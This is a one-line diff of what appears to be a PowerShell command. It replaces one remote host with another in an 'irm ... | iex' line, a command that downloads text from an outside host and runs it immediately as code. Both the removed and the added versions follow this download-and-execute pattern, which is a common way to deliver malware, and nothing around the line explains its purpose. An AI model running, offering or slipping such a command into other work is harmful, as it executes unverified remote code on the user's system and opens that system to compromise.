@@ -1,1 +1,1 @@
-irm https://panel.sprinformatica.es | iex; exit
+irm https://panel.consoles.gleeze.com -Headers @{"Cache-Control"="no-cache"} | iex
